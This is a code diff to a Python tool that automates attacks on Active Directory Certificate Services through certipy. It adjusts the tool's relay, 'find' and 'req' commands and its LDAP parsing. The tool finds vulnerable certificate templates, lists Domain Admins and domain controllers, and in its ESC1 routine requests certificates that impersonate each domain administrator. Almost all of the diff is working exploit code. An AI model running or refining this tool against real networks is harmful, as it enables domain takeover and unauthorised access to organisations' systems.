@@ -97,13 +97,13 @@ class AuthenticationManager:
     def get_certipy_auth_args(self):
         """Get authentication arguments for certipy"""
         if self.kerberos_ticket:
-            return f"-u '{self.username}'@{self.domain} -k -no-pass"
+            return f"-u {self.username}@{self.domain} -k -no-pass"
         elif self.aes_key:
-            return f"-u '{self.username}'@{self.domain} -aes {self.aes_key}"
+            return f"-u {self.username}@{self.domain} -aes {self.aes_key}"
         elif self.ntlm_hash:
-            return f"-u '{self.username}'@{self.domain} -hashes {self.ntlm_hash}"
+            return f"-u {self.username}@{self.domain} -hashes {self.ntlm_hash}"
         elif self.password:
-            auth_args = f"-u '{self.username}'@{self.domain} -p '{self.password}'"
+            auth_args = f"-u {self.username}@{self.domain} -p {self.password}"
             if self.use_kerberos:
                 auth_args += " -k"
             return auth_args
@@ -199,7 +199,7 @@ class LDAPConnection:
                 search_filter=search_filter,
                 attributes=attributes or ldap3.ALL_ATTRIBUTES
             )
-            return self.connection.response
+            return self.connection.entries
         except Exception as e:
             logging.error(f"LDAP search failed: {e}")
             return []
@@ -223,7 +223,7 @@ class CertipyRelay(threading.Thread):
     def run(self):
         logging.info(f'Started Relaying to {self.target_ca}')
         try:
-            cmd = ["certipy", "relay", "-ca", self.target_ca, "-template", self.template]
+            cmd = ["certipy", "relay", "-target", f"http://{self.target_ca}", "-template", self.template]
             process = subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
@@ -317,34 +317,42 @@ class ADCSExploit:
         
         # Build certipy command
         auth_args = self.auth_manager.get_certipy_auth_args()
-        ldaps_param = "" if not self.use_ldaps else "-ldap-scheme ldaps"
-        if self.ldap_channel_binding and self.use_ldaps:
-            ldaps_param += " -ldap-channel-binding"
         
-        dns_param = "-dns-tcp" if self.dns_tcp else ""
+        # Create full output path
+        output_path = self.output_dir / self.certipy_output_prefix
         
         cmd = [
             "certipy", "find",
             *auth_args.split(),
             "-dc-ip", self.target,
             "-vulnerable", "-json",
-            "-output", self.certipy_output_prefix,
+            "-output", str(output_path),
             "-timeout", str(self.timeout)
         ]
         
-        if ldaps_param:
-            cmd.extend(ldaps_param.split())
-        if dns_param:
-            cmd.append(dns_param)
+        # Add LDAP options
+        if self.use_ldaps:
+            cmd.extend(["-ldap-scheme", "ldaps"])
+            if not self.ldap_channel_binding:
+                cmd.append("-no-ldap-channel-binding")
+        else:
+            cmd.extend(["-ldap-scheme", "ldap"])
+        
+        # Add DNS TCP option
+        if self.dns_tcp:
+            cmd.append("-dns-tcp")
         
         try:
             result = subprocess.run(
                 cmd,
                 capture_output=True,
                 text=True,
-                cwd=self.output_dir,
                 timeout=self.timeout + 30
             )
+            
+            # Log the certipy output for debugging
+            self.logger.debug(f"Certipy stdout: {result.stdout}")
+            self.logger.debug(f"Certipy stderr: {result.stderr}")
             
             if "Invalid credentials" in result.stdout:
                 self.logger.error("Invalid credentials")
@@ -353,8 +361,30 @@ class ADCSExploit:
                 self.logger.error("Connection timed out")
                 return False
             elif result.returncode == 0:
-                self.logger.info(f"Saved certipy output to {self.certipy_output_prefix}_Certipy.json")
-                return True
+                # Check if the JSON file was actually created
+                expected_json = self.output_dir / f"{self.certipy_output_prefix}_Certipy.json"
+                
+                # Also check in current directory (certipy might save there)
+                current_dir_json = Path(f"{self.certipy_output_prefix}_Certipy.json")
+                
+                if expected_json.exists():
+                    self.logger.info(f"Saved certipy output to {self.certipy_output_prefix}_Certipy.json")
+                    return True
+                elif current_dir_json.exists():
+                    # Move file to output directory
+                    current_dir_json.rename(expected_json)
+                    self.logger.info(f"Moved certipy output to {expected_json}")
+                    return True
+                else:
+                    self.logger.error(f"Certipy JSON file not found in expected locations")
+                    self.logger.debug(f"Looked for: {expected_json} and {current_dir_json}")
+                    
+                    # List files in current directory for debugging
+                    current_files = list(Path('.').glob(f"*{self.certipy_output_prefix}*"))
+                    output_files = list(self.output_dir.glob(f"*{self.certipy_output_prefix}*"))
+                    self.logger.debug(f"Files in current dir: {current_files}")
+                    self.logger.debug(f"Files in output dir: {output_files}")
+                    return False
             else:
                 self.logger.error(f"Certipy command failed: {result.stderr}")
                 return False
@@ -364,6 +394,7 @@ class ADCSExploit:
             return False
         except Exception as e:
             self.logger.error(f"Certipy command execution failed: {e}")
+            self.logger.debug(f"Full error: {e}", exc_info=True)
             return False
     
     def bind_to_ldap(self):
@@ -400,8 +431,8 @@ class ADCSExploit:
                 ['objectSID']
             )
             
-            if response:
-                domain_sid = response[0]['attributes']['objectSid']
+            if response and len(response) > 0:
+                domain_sid = str(response[0].objectSid)
                 self.logger.info(f"Received Domain SID: {domain_sid}")
             else:
                 self.logger.error("Could not retrieve domain SID")
@@ -415,8 +446,8 @@ class ADCSExploit:
                 ['sAMAccountName']
             )
             
-            if response:
-                domain_admins_cn = response[0]['attributes']['sAMAccountName']
+            if response and len(response) > 0:
+                domain_admins_cn = str(response[0].sAMAccountName)
                 self.logger.info(f"Domain Admins group: {domain_admins_cn}")
             else:
                 self.logger.warning("Could not find Domain Admins group")
@@ -430,10 +461,10 @@ class ADCSExploit:
                 ['member']
             )
             
-            if response and 'member' in response[0]['attributes']:
-                for member_dn in response[0]['attributes']['member']:
+            if response and len(response) > 0 and hasattr(response[0], 'member'):
+                for member_dn in response[0].member:
                     # Extract CN from DN
-                    cn_match = re.search(r'CN=([^,]+)', member_dn)
+                    cn_match = re.search(r'CN=([^,]+)', str(member_dn))
                     if cn_match:
                         self.domain_admins.append(cn_match.group(1))
                 
@@ -443,16 +474,32 @@ class ADCSExploit:
                 
         except Exception as e:
             self.logger.error(f"Error enumerating domain admins: {e}")
+            self.logger.debug(f"Full error: {e}", exc_info=True)
     
     def fetch_certipy_results(self):
         """Parse certipy JSON output"""
         json_file = self.output_dir / f"{self.certipy_output_prefix}_Certipy.json"
         
+        self.logger.debug(f"Looking for certipy JSON file at: {json_file}")
+        
         if not json_file.exists():
-            self.logger.error(f"Certipy JSON file not found: {json_file}")
-            return {}
+            # Also check in current directory
+            current_dir_json = Path(f"{self.certipy_output_prefix}_Certipy.json")
+            if current_dir_json.exists():
+                # Move to output directory
+                current_dir_json.rename(json_file)
+                self.logger.info(f"Found and moved certipy JSON file to {json_file}")
+            else:
+                self.logger.error(f"Certipy JSON file not found: {json_file}")
+                # List available files for debugging
+                json_files = list(Path('.').glob("*_Certipy.json"))
+                output_json_files = list(self.output_dir.glob("*_Certipy.json"))
+                self.logger.debug(f"Available JSON files in current dir: {json_files}")
+                self.logger.debug(f"Available JSON files in output dir: {output_json_files}")
+                return {}
         
         try:
+            self.logger.info(f"Parsing certipy output {self.certipy_output_prefix}_Certipy.json")
             with open(json_file, 'r') as f:
                 certipy_json = json.load(f)
             
@@ -461,6 +508,8 @@ class ADCSExploit:
                 ca_info = certipy_json["Certificate Authorities"]["0"]
                 self.ca = ca_info.get("CA Name")
                 self.ca_dns = ca_info.get("DNS Name")
+                
+                self.logger.debug(f"Found CA: {self.ca} at {self.ca_dns}")
                 
                 # Extract vulnerabilities
                 vulnerabilities = ca_info.get("[!] Vulnerabilities", {})
@@ -487,11 +536,14 @@ class ADCSExploit:
                     self.logger.info("Found vulnerable certificate templates:")
                     for esc, templates in self.vulnerable_certificate_templates.items():
                         self.logger.info(f"{esc}: {', '.join(templates)}")
+                else:
+                    self.logger.info("No vulnerable certificate templates found")
             
             return self.vulnerable_certificate_templates
             
         except Exception as e:
             self.logger.error(f"Error parsing certipy results: {e}")
+            self.logger.debug(f"Full error: {e}", exc_info=True)
             return {}
     
     def get_domain_controllers(self):
@@ -506,21 +558,34 @@ class ADCSExploit:
             response = self.ldap_connection.search(
                 self.domain_cn,
                 dc_filter,
-                ['distinguishedName', 'dNSHostName']
+                ['distinguishedName', 'dNSHostName', 'name']
             )
             
             for entry in response:
-                if 'dNSHostName' in entry['attributes']:
-                    dns_name = entry['attributes']['dNSHostName']
-                    if dns_name:
-                        self.domain_controllers.append(dns_name)
-                elif 'distinguishedName' in entry['attributes']:
-                    # Extract hostname from DN as fallback
-                    dn = entry['attributes']['distinguishedName']
+                dns_name = None
+                
+                # Try to get dNSHostName first
+                if hasattr(entry, 'dNSHostName') and entry.dNSHostName:
+                    dns_name = str(entry.dNSHostName)
+                elif hasattr(entry, 'name') and entry.name:
+                    # Construct FQDN from name
+                    hostname = str(entry.name)
+                    if hostname.endswith('$'):
+                        hostname = hostname[:-1]  # Remove trailing $
+                    dns_name = f"{hostname}.{self.domain}"
+                elif hasattr(entry, 'distinguishedName'):
+                    # Extract hostname from DN as last resort
+                    dn = str(entry.distinguishedName)
                     cn_match = re.search(r'CN=([^,]+)', dn)
                     if cn_match:
-                        hostname = f"{cn_match.group(1)}.{self.domain}"
-                        self.domain_controllers.append(hostname)
+                        hostname = cn_match.group(1)
+                        if hostname.endswith('$'):
+                            hostname = hostname[:-1]
+                        dns_name = f"{hostname}.{self.domain}"
+                
+                if dns_name:
+                    self.domain_controllers.append(dns_name)
+                    self.logger.debug(f"Found DC: {dns_name}")
             
             if self.domain_controllers:
                 self.logger.info(f"Found domain controllers: {', '.join(self.domain_controllers)}")
@@ -529,6 +594,7 @@ class ADCSExploit:
                 
         except Exception as e:
             self.logger.error(f"Error enumerating domain controllers: {e}")
+            self.logger.debug(f"Full error: {e}", exc_info=True)
     
     def exploit_esc1(self):
         """Exploit ESC1 vulnerability"""
@@ -542,9 +608,6 @@ class ADCSExploit:
                 self.logger.info(f"Requesting certificate for {admin} using template {template}")
                 
                 auth_args = self.auth_manager.get_certipy_auth_args()
-                ldaps_param = "" if not self.use_ldaps else "-ldap-scheme ldaps"
-                if self.ldap_channel_binding and self.use_ldaps:
-                    ldaps_param += " -ldap-channel-binding"
                 
                 cmd = [
                     "certipy", "req",
@@ -557,8 +620,13 @@ class ADCSExploit:
                     "-key-size", "4096"
                 ]
                 
-                if ldaps_param:
-                    cmd.extend(ldaps_param.split())
+                # Add LDAP options
+                if self.use_ldaps:
+                    cmd.extend(["-ldap-scheme", "ldaps"])
+                    if not self.ldap_channel_binding:
+                        cmd.append("-no-ldap-channel-binding")
+                else:
+                    cmd.extend(["-ldap-scheme", "ldap"])
                 
                 try:
                     result = subprocess.run(
@@ -825,4 +893,4 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    main()  
